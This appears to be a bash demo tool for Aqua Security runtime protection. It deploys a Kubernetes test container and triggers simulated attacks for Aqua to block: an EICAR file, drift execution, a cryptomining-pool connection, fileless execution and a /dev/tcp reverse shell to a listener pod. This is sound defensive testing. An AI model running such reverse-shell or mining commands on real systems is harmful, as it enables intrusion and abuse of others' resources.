#!/bin/bash

print_logo() {
    echo -e "                                                                                          "
    echo -e "                                                                                          "
    echo -e "                                                                                          "
    echo -e "         \033[0;33m.:-----\033[0m\033[0;31m=##*.\033[0m       .--=--.         :-==-:      ::.        :::     .:-==-.        "
    echo -e "        \033[0;33m:-------\033[0m\033[0;31m=%%%:\033[0m     -#%%%%%%%#-     +%%%%%%%%*:   %%*        %%#   :#%%%%%%%#-      "
    echo -e "      \033[0;36m:-\033[0m        \033[0;31m:%%%:\033[0m    *%%+:   :+%%*  .#%%=.  .-#%%-  %%*        %%#  +%%+:   :+%%*     "
    echo -e "    \033[0;36m.---\033[0m        \033[0;31m:%%%:\033[0m   =%%=       =%%- *%%.       #%%  %%*        %%# -%%+       -%%=    "
    echo -e "    \033[0;36m.---\033[0m        \033[0;31m:%%%:\033[0m   =%%-       -%%= *%%.       *%%  %%#       .%%* -%%=       .%%+    "
    echo -e "    \033[0;36m.---\033[0m        \033[0;31m:%%%:\033[0m   =%%-       -%%= *%%.       *%%  %%#       .%%* -%%=       .%%+    "
    echo -e "    \033[0;36m.---\033[0m        \033[0;31m:#+:\033[0m     #%%=.     -%%= .%%#-      *%%  =%%+.    :#%%.  #%%=.     .%%+    "
    echo -e "    \033[0;34m:***++++++++-.\033[0m        =%%%%#####%%=  .+%%%##*: *%%   -*%%%##%%%+.    -#%%%#####%%+    "
    echo -e "    \033[0;34m:#########+.\033[0m            .-=+++++++:     :==-   *%%     .-=++=:         .-=+++++++-    "
    echo -e "                                                   *%%                                    "
    echo -e "                                                   *%%                                    "
    echo -e "                                                   *%%                                    "
    echo "                                                                                          "
    echo "                                                                                          "
    echo "     Tool developed by: Stan Hoe, Solution Architect APJ                                       "
    echo "                                                                                          "
    echo "                                                                                          "
}


print_welcome_message() {
    echo "=========================================================================================="
    echo "                    Welcome to Warden, the Aqua Runtime Security POV Tool                 "
    echo "=========================================================================================="
    echo "                                                                                          "
    echo "     Explore various security features of Aqua Security with this interactive tool.       " 
    echo "     Experience Real-time Malware Protection, Drift Prevention, and much more.            "
    echo "     Get ready to dive into container security with Aqua!                                 "
    echo "                                                                                          "
    echo "=========================================================================================="
}

print_colored_message() {
    local color="$1"
    local message="$2"

    case "$color" in
        red)
            echo -e "\033[0;31m$message\033[0m"
            ;;
        blue)
            echo -e "\033[0;34m$message\033[0m"
            ;;
        green)
            echo -e "\033[0;32m$message\033[0m"
            ;;
        yellow)
            echo -e "\033[0;33m$message\033[0m"
            ;;
        *)
            echo "Invalid color. Please choose from: red, blue, green, yellow."
            ;;
    esac
}

check_kubernetes_connection() {
    echo -n "Checking Kubernetes connection"
    for i in {1..10}; do
        echo -n "."
        sleep 0.2
    done
    print_colored_message green "[✓] Done"

    # Check if connected to a Kubernetes cluster
    if kubectl cluster-info &>/dev/null; then
        print_colored_message green "✓ Kubernetes cluster connected"
        echo
    else
        print_colored_message red "✗ Error: Not connected to a valid Kubernetes cluster."
        exit 1
    fi
}


check_aqua_agent_daemonset() {
    echo -n "Checking Aqua Enforcer (aqua-agent) daemonset"
    for i in {1..10}; do
        echo -n "."
        sleep 0.2
    done
    print_colored_message green "[✓] Done"

    # Check if aqua-agent daemonset exists in the aqua namespace
    if kubectl get daemonset -n aqua aqua-agent &>/dev/null; then
        print_colored_message green "✓ Aqua Enforcer daemonset found"
        echo
    else
        print_colored_message red "✗ Error: Aqua Enforcer daemonset not found. Please deploy the Aqua Enforcer."
        exit 1
    fi
}

check_container_existence() {
    # Check if the aqua-test-container deployment already exists
    kubectl get deployment aqua-test-container >/dev/null 2>&1
    return $?
}

test_realtime_malware_protection_wget() {
    if [ "$AQUA_WARDEN_SKIP_INSTRUCTIONS" ]; then
        prerequisites_met="Y" # Set prerequisites_met to 'Y' immediately
    else
        # Ask user if prerequisites are met
        echo
        print_colored_message yellow "[!] In order to test out the use case successfully, please ensure that the following prerequisites are met:
        1. Create a Custom Policy with Real-time Malware Protection Control enabled
        2. Ensure that the Real-time Malware Protection Control is set to 'Delete' action
        3. Ensure that the Custom Policy is set to 'Enforce' mode
        4. Ensure that Block Container Exec Control is disabled"

        echo
        read -p "Proceed? (y/n): " prerequisites_met
    fi

    case $prerequisites_met in
        [Yy]*)
            # Execute commands in the deployed container
            if check_container_existence; then
                pod_name=$(kubectl get pods -l app=aqua-test-container -o jsonpath='{.items[0].metadata.name}')
                container_name=$(kubectl get pods $pod_name -o jsonpath='{.spec.containers[0].name}')
                echo
                print_colored_message yellow "Executing 'ls -la' command in the container..."
                echo
                kubectl exec -it $pod_name --container $container_name -- ls -la /tmp/
                sleep 1.5
                echo
                print_colored_message yellow "Executing wget command in the container to download eicar AMP test file..."
                echo
                kubectl exec -it $pod_name --container $container_name -- wget https://raw.githubusercontent.com/stanezil/eicar/main/eicar.txt
                if [ $? -eq 0 ]; then
                    echo
                    print_colored_message yellow "Eicar AMP test file downloaded successfully."
                else
                    echo
                    print_colored_message red "Failed to download Eicar AMP test file."
                fi
                sleep 1.5
                echo
                print_colored_message yellow "Executing 'ls -la' command again in the container..."
                echo
                print_colored_message yellow "[!] Observe in the output below that the downloaded eicar file is not in sight because it has been deleted by Aqua."
                echo 
                kubectl exec -it $pod_name --container $container_name -- ls -la /tmp/
                echo
                print_colored_message green "[✓] Please login to the Aqua Console's Incident Screen to view a summary of the security incident."

            else
                print_colored_message yellow "[!] Aqua test container is not deployed. Please deploy it first with option 1."
            fi
            ;;
        [Nn]*)
            echo "Please ensure the prerequisites are met before proceeding."
            ;;
        *)
            echo "Invalid input. Please enter 'y' for yes or 'n' for no."
            ;;
    esac
}

test_realtime_malware_protection() {
  # Split and concatenate the EICAR string (done at the start for consistency)
  string1='X5O!P%@AP[4\PZX54(P^)'
  string2='7CC)7}$EICAR-STANDARD'
  string3='-ANTIVIRUS-TEST-FILE!$H+H*'
  eicar_string="$string1$string2$string3"

  if [ "$AQUA_WARDEN_SKIP_INSTRUCTIONS" ]; then
    prerequisites_met="Y"
  else
    # Ask user if prerequisites are met
    echo
    print_colored_message yellow "[!] In order to test out the use case successfully, please ensure that the following prerequisites are met:
    1. Create a Custom Policy with Real-time Malware Protection Control enabled
    2. Ensure that the Real-time Malware Protection Control is set to 'Delete' action
    3. Ensure that the Custom Policy is set to 'Enforce' mode
    4. Ensure that Block Container Exec Control is disabled"

    echo
    read -p "Proceed? (y/n): " prerequisites_met
  fi

  case $prerequisites_met in
    [Yy]*)
      if check_container_existence; then
        pod_name=$(kubectl get pods -l app=aqua-test-container -o jsonpath='{.items[0].metadata.name}')
        container_name=$(kubectl get pods $pod_name -o jsonpath='{.spec.containers[0].name}')
        echo
        print_colored_message yellow "Executing 'ls -la' command in the container..."
        echo
        kubectl exec -it $pod_name --container $container_name -- ls -la /tmp/
        sleep 1.5

        # Create the eicar.txt file and write the concatenated string
        echo
        print_colored_message yellow "Creating and writing EICAR string to eicar.txt in the container..."
        echo
        kubectl exec -it $pod_name --container $container_name -- bash -c "touch /tmp/eicar.txt && echo '$eicar_string' > /tmp/eicar.txt"
        if [ $? -eq 0 ]; then
          echo
          print_colored_message yellow "Eicar string written to file successfully."
        else
          echo
          print_colored_message red "Failed to write Eicar string to file."
        fi
        
        sleep 1.5
        echo
        print_colored_message yellow "Executing 'ls -la' command again in the container..."
        echo
        print_colored_message yellow "[!] Observe in the output below that the downloaded eicar file is not in sight because it has been deleted by Aqua."
        echo
        kubectl exec -it $pod_name --container $container_name -- ls -la /tmp/
        echo
        print_colored_message green "[✓] Please login to the Aqua Console's Incident Screen to view a summary of the security incident."

      else  
        print_colored_message yellow "[!] Aqua test container is not deployed. Please deploy it first with option 1."
      fi
      ;;

    [Nn]*)
      echo "Please ensure the prerequisites are met before proceeding."
      ;;
    *)
      echo "Invalid input. Please enter 'y' for yes or 'n' for no."
      ;;
  esac
}


# Drift Prevention
test_drift_prevention() {
    if [ "$AQUA_WARDEN_SKIP_INSTRUCTIONS" ]; then
        prerequisites_met="Y" # Set prerequisites_met to 'Y' immediately
    else
        # Ask user if prerequisites are met
        echo
        print_colored_message yellow "[!] In order to test out the use case successfully, please ensure that the following prerequisites are met:
        1. Create a Custom Policy with Drift Prevention Control enabled
        2. Ensure that the Custom Policy is set to 'Enforce' mode
        3. Ensure that Block Container Exec Control is disabled"
        echo
        read -p "Proceed? (y/n): " prerequisites_met
    fi

    case $prerequisites_met in
        [Yy]*)
            # Make a copy of /bin/ls and execute the copy
            if check_container_existence; then
                pod_name=$(kubectl get pods -l app=aqua-test-container -o jsonpath='{.items[0].metadata.name}')
                container_name=$(kubectl get pods $pod_name -o jsonpath='{.spec.containers[0].name}')
                echo
                print_colored_message yellow "Copying '/bin/wget' to '/tmp/wget_copy' in the container..."
                echo
                echo "kubectl exec -it $pod_name --container $container_name -- cp /bin/wget /tmp/wget_copy"
                kubectl exec -it $pod_name --container $container_name -- cp /bin/wget /tmp/wget_copy
                echo
                print_colored_message yellow "Executing '/tmp/wget_copy' command in the container..."
                echo
                echo "kubectl exec -it $pod_name --container $container_name -- /tmp/wget_copy google.com"
                kubectl exec -it $pod_name --container $container_name -- /tmp/wget_copy google.com
                echo
                print_colored_message yellow "[!] Observe that an error code or kill signal was returned because it has been blocked by Aqua."
                echo
                print_colored_message green "[✓] Please login to the Aqua Console's Incident Screen to view a summary of the security incident."
            else
                print_colored_message yellow "[!] Aqua test container is not deployed. Please deploy it first with option 1."
            fi
            ;;
        [Nn]*)
            echo "Please ensure the prerequisites are met before proceeding."
            ;;
        *)
            echo "Invalid input. Please enter 'y' for yes or 'n' for no."
            ;;
    esac
}


# Block Cryptomining
test_block_cryptocurrency_mining() {
    if [ "$AQUA_WARDEN_SKIP_INSTRUCTIONS" ]; then
        prerequisites_met="Y" # Set prerequisites_met to 'Y' immediately
    else
        # Ask user if prerequisites are met
        echo
        print_colored_message yellow "[!] In order to test out the use case successfully, please ensure that the following prerequisites are met:
        1. Create a Custom Policy with Block Cryptocurrency Mining Control enabled
        2. Ensure that the Custom Policy is set to 'Enforce' mode
        3. Ensure that Block Container Exec Control is disabled"
        echo
        read -p "Proceed? (y/n): " prerequisites_met
    fi

    case $prerequisites_met in
        [Yy]*)
            # Execute commands in the deployed container
            if check_container_existence; then
                pod_name=$(kubectl get pods -l app=aqua-test-container -o jsonpath='{.items[0].metadata.name}')
                container_name=$(kubectl get pods $pod_name -o jsonpath='{.spec.containers[0].name}')
                echo
                print_colored_message yellow "Executing 'wget us-east.cryptonight-hub.miningpoolhub.com:205' command in the container..."
                echo
                kubectl exec -it $pod_name --container $container_name -- wget us-east.cryptonight-hub.miningpoolhub.com:205
                echo
                print_colored_message yellow "[!] Observe that an error code or kill signal was returned because it has been blocked by Aqua."
                echo
                print_colored_message green "[✓] Please login to the Aqua Console's Incident Screen to view a summary of the security incident."
            else
                print_colored_message yellow "[!] Aqua test container is not deployed. Please deploy it first with option 1."
            fi
            ;;
        [Nn]*)
            echo "Please ensure the prerequisites are met before proceeding."
            ;;
        *)
            echo "Invalid input. Please enter 'y' for yes or 'n' for no."
            ;;
    esac
}


# Block Fileless Exec
test_block_fileless_execution() {
    if [ "$AQUA_WARDEN_SKIP_INSTRUCTIONS" ]; then
        prerequisites_met="Y" # Set prerequisites_met to 'Y' immediately
    else
        # Ask user if prerequisites are met
        echo
        print_colored_message yellow "[!] In order to test out the use case successfully, please ensure that the following prerequisites are met:
        1. Create a Custom Policy with Block Fileless Execution Control enabled
        2. Ensure that the Custom Policy is set to 'Enforce' mode
        3. Ensure that Block Container Exec Control is disabled"
        echo
        read -p "Proceed? (y/n): " prerequisites_met
    fi

    case $prerequisites_met in
        [Yy]*)
            # Execute commands in the deployed container
            if check_container_existence; then
                pod_name=$(kubectl get pods -l app=aqua-test-container -o jsonpath='{.items[0].metadata.name}')
                container_name=$(kubectl get pods $pod_name -o jsonpath='{.spec.containers[0].name}')
                echo
                print_colored_message yellow "Executing './memrun filelessexec /bin/wget' command in the container..."
                echo
                kubectl exec -it $pod_name --container $container_name -- ./tmp/memrun filelessexec /bin/wget
                print_colored_message yellow "[!] Observe that an error code or kill signal was returned because it has been blocked by Aqua."
                echo
                print_colored_message green "[✓] Please login to the Aqua Console's Incident Screen to view a summary of the security incident."
            else
                print_colored_message yellow "[!] Aqua test container is not deployed. Please deploy it first with option 1."
            fi
            ;;
        [Nn]*)
            echo "Please ensure the prerequisites are met before proceeding."
            ;;
        *)
            echo "Invalid input. Please enter 'y' for yes or 'n' for no."
            ;;
    esac
}


# Block Reverse Shell
test_reverse_shell() {
    if [ "$AQUA_WARDEN_SKIP_INSTRUCTIONS" ]; then
        prerequisites_met="Y" # Set prerequisites_met to 'Y' immediately
    else
        # Ask user if prerequisites are met
        echo
        print_colored_message yellow "[!] In order to test out the use case successfully, please ensure that the following prerequisites are met:
        1. Create a Custom Policy with Reverse Shell Control enabled
        2. Ensure that the Custom Policy is set to 'Enforce' mode
        3. Ensure that Block Container Exec Control is disabled"
        echo
        read -p "Proceed? (y/n): " prerequisites_met
    fi

    case $prerequisites_met in
        [Yy]*)
            # Execute commands in the deployed container
            if check_container_existence; then
                # Create a listener pod with nc listener
                echo
                print_colored_message yellow "Creating listener pod"
                kubectl run listener --image=$AQUA_WARDEN_IMAGE --command sleep infinity
                echo
                print_colored_message yellow "Waiting for the listener container pod to start running..."
                while ! kubectl get pods | grep listener | grep -q "Running"; do
                    sleep 5
                done
                echo
                print_colored_message yellow "Listener container pod is running. Configuring nc listener in pod..."
                echo
                kubectl exec listener -- bash -c "nohup nc -l -p 12345 >/dev/null 2>&1 &" 
                echo
                print_colored_message yellow "Retrieving IP address..."
                listener_pod_ip=$(kubectl get pods -o wide | grep listener | awk '{print $6}')
                echo "$listener_pod_ip"
                echo
                print_colored_message yellow "Executing reverse shell from Aqua test container to listener container..."
                echo
                aqua_test_container=$(kubectl get pods -l app=aqua-test-container -o jsonpath='{.items[0].metadata.name}')
                kubectl exec -it $aqua_test_container -- bash -c "exec id &>/dev/tcp/$listener_pod_ip/12345 <&1"
                echo
                print_colored_message yellow "[!] Observe that an error code or kill signal was returned because it has been blocked by Aqua".
                echo
            else
                print_colored_message yellow "[!] Aqua test container is not deployed. Please deploy it first with option 1."
            fi
            ;;
        [Nn]*)
            echo "Please ensure the prerequisites are met before proceeding."
            ;;
        *)
            echo "Invalid input. Please enter 'y' for yes or 'n' for no."
            ;;
    esac
}


# Executables Blocked
test_executables_blocked() {
    if [ "$AQUA_WARDEN_SKIP_INSTRUCTIONS" ]; then
        prerequisites_met="Y" # Set prerequisites_met to 'Y' immediately
    else
        # Ask user if prerequisites are met
        echo
        print_colored_message yellow "[!] In order to test out the use case successfully, please ensure that the following prerequisites are met:
        1. Create a Custom Policy with Executables Block Control enabled
        2. Add 'ps' to the list of blocked executables 
        3. Ensure that the Custom Policy is set to 'Enforce' mode
        4. Ensure that Block Container Exec Control is disabled"
        echo
        read -p "Proceed? (y/n): " prerequisites_met
    fi

    case $prerequisites_met in
        [Yy]*)
            # Execute commands in the deployed container
            if check_container_existence; then
                pod_name=$(kubectl get pods -l app=aqua-test-container -o jsonpath='{.items[0].metadata.name}')
                container_name=$(kubectl get pods $pod_name -o jsonpath='{.spec.containers[0].name}')
                echo
                print_colored_message yellow "Executing the blocked 'ps' command in the container..."
                echo
                echo "kubectl exec -it $pod_name --container $container_name -- bash -c ps"
                echo
                kubectl exec -it $pod_name --container $container_name -- bash -c "ps"
                echo
                print_colored_message yellow "[!] Observe that an error code or kill signal was returned because it has been blocked by Aqua."
                echo
                print_colored_message green "[✓] Please login to the Aqua Console's Incident Screen to view a summary of the security incident."
            else
                print_colored_message yellow "[!] Aqua test container is not deployed. Please deploy it first with option 1."
            fi
            ;;
        [Nn]*)
            echo "Please ensure the prerequisites are met before proceeding."
            ;;
        *)
            echo "Invalid input. Please enter 'y' for yes or 'n' for no."
            ;;
    esac
}


# Block Container Exec
test_block_container_exec() {
    if [ "$AQUA_WARDEN_SKIP_INSTRUCTIONS" ]; then
        prerequisites_met="Y" # Set prerequisites_met to 'Y' immediately
    else
        # Ask user if prerequisites are met
        echo
        print_colored_message yellow "[!] In order to test out the use case successfully, please ensure that the following prerequisites are met:
        1. Create a Custom Policy with Block Container Exec Control enabled
        2. Ensure that the Custom Policy is set to 'Enforce' mode"
        echo
        read -p "Proceed? (y/n): " prerequisites_met
    fi

    case $prerequisites_met in
        [Yy]*)
            # Execute commands in the deployed container
            if check_container_existence; then
                pod_name=$(kubectl get pods -l app=aqua-test-container -o jsonpath='{.items[0].metadata.name}')
                container_name=$(kubectl get pods $pod_name -o jsonpath='{.spec.containers[0].name}')
                echo "Executing shell session in the Aqua test application container..."
                echo
        kubectl exec -it $pod_name --container $container_name -- bash
                echo
                print_colored_message yellow "[!] Observe that an error code or kill signal was returned because it has been blocked by Aqua."
                echo
                print_colored_message green "[✓] Please login to the Aqua Console's Incident Screen to view a summary of the security incident."
            else
                print_colored_message yellow "[!] Aqua test container is not deployed. Please deploy it first with option 1."
            fi
            ;;
        [Nn]*)
            echo "Please ensure the prerequisites are met before proceeding."
            ;;
        *)
            echo "Invalid input. Please enter 'y' for yes or 'n' for no."
            ;;
    esac
}


# Terminate the program
terminate_program() {
    read -p "Are you sure you want to terminate the program? (y/n): " terminate_choice
    case $terminate_choice in
        [Yy]*)
            if check_container_existence || check_pod_status "listener"; then
                read -p "Do you want to delete the Aqua test container before termination? (y/n): " delete_container
                if [[ $delete_container =~ ^[Yy] ]]; then
                    delete_test_container
                    delete_listener_container
                elif [[ $delete_container =~ ^[Nn] ]]; then
                    echo "Exiting program without deleting the Aqua test container."
                else
                    echo "Invalid input. Exiting program without deleting the Aqua test container."
                fi
            else
                echo "Aqua test container or listener container is not running."
                echo "Exiting program without deleting the Aqua test container."
            fi
            unset AQUA_WARDEN_SKIP_INSTRUCTIONS # Unset env var for skip instructions flag
            unset AQUA_WARDEN_IMAGE # Unset env var for image flag
            exit
            ;;
        [Nn]*)
            echo "Cancelled termination. Returning to the main menu."
            ;;
        *)
            echo "Invalid input. Returning to the main menu."
            ;;
    esac
}


check_pod_status() {
    local pod_name=$1
    kubectl get pods | grep $pod_name | grep -q "Running"
}

deploy_test_container() {
    # Check if the aqua-test-container deployment already exists
    if check_container_existence; then
        echo "Aqua test container already exists. Redeploying..."
        delete_test_container
    fi

    echo
    print_colored_message yellow "Deploying Aqua test container..."
    # Deploying the container using kubectl
    kubectl create deployment aqua-test-container --image=$AQUA_WARDEN_IMAGE -- sleep infinity

    # Wait for the deployment to complete
    echo
    print_colored_message yellow "Waiting for the deployment to complete..."
    kubectl wait --for=condition=available deployment/aqua-test-container --timeout=60s

    # Check if deployment was successful
    if [ $? -eq 0 ]; then
        echo
        print_colored_message green "✓ Aqua test container deployed successfully."
        echo
    else
        print_colored_message red " Failed to deploy Aqua test container."
        echo
    fi
}

delete_test_container() {
    echo "Deleting Aqua test container..."
    kubectl delete deployment aqua-test-container
}

check_listener_container_existence() {
    # Check if the listener container exists
    kubectl get pod listener >/dev/null 2>&1
    return $?
}

delete_listener_container() {
    if check_listener_container_existence; then
        echo "Deleting listener container..."
        kubectl delete pod listener --force
    fi
}

check_no_instructions_flag() {
  if [[ "$1" == "--no-instructions" || "$1" == "-n" ]]; then
    echo "Detected --no-instructions flag"
    export AQUA_WARDEN_SKIP_INSTRUCTIONS=1
  fi
}

handle_flags() {
  export AQUA_WARDEN_IMAGE="stanhoe/aqua-warden:latest"

  while [[ $# -gt 0 ]]; do  # Loop until all arguments are processed
    case "$1" in
      --image | -i)
        shift   # Shift to the next argument (the image name)
        if [[ $# -gt 0 ]]; then  # Ensure an image name is provided
          image_arg="$1"  # Store the image name
          echo "Detected --image flag with argument: $image_arg"
          export AQUA_WARDEN_IMAGE=$image_arg
          shift   # Shift again to consume the image name
        else
          echo "Error: --image flag requires an argument" >&2
          exit 1
        
        fi
        ;;
      --no-instructions|-n)
        export AQUA_WARDEN_SKIP_INSTRUCTIONS=1
        echo "Detected --no-instructions flag"
        shift   # Shift to the next argument
        ;;
      *)
        echo "Unknown flag: $1" >&2  # Print to standard error
        shift   # Shift to the next argument
        ;;
    esac
  done
}


# Main 
main() {
    print_logo
    print_welcome_message
    echo

    handle_flags "$@"
    echo

    check_kubernetes_connection
    check_aqua_agent_daemonset

    # Check if Aqua test container exists
    if check_container_existence; then
        echo "Aqua test container already exists."
        read -p "Would you like to redeploy the test application? (y/n): " redeploy_choice
        if [[ "$redeploy_choice" =~ ^[Yy] ]]; then
            delete_test_container
            deploy_test_container
            echo
        else
            echo "Proceeding to menu..."
            echo
        fi
    else
        print_colored_message yellow "[!] Aqua test container does not exist - Select option 1 to deploy."
        echo
        echo "Proceeding to menu..."
        echo 
    fi
    echo

    while true; do
        echo "Please select an option:"
        echo "1. Deploy/Redeploy test container"
        echo "2. Test Real-time Malware Protection [Delete action]"
        echo "3. Test Drift Prevention"
        echo "4. Test Block Cryptocurrency Mining"
        echo "5. Test Block Fileless Execution"
        echo "6. Test Reverse Shell"
        echo "7. Test Executables Blocked [ps]"
        echo "8. Test Block Container Exec"
        echo "9. Terminate Program"
        echo

        read -p "Enter your choice (1-9): " choice

        case $choice in
            1)
                deploy_test_container
                ;;
            2)
                test_realtime_malware_protection
                ;;
            3)
                test_drift_prevention
                ;;
            4)
                test_block_cryptocurrency_mining
                ;;
            5)
                test_block_fileless_execution
                ;;
            6)
                test_reverse_shell
                ;;
            7)
                test_executables_blocked 
                ;;
            8)
                test_block_container_exec
                ;;
            9)
                terminate_program
                ;;
        esac

        echo
        # Add a short delay before showing the options menu again
        sleep 2
    done
}

main "$@"
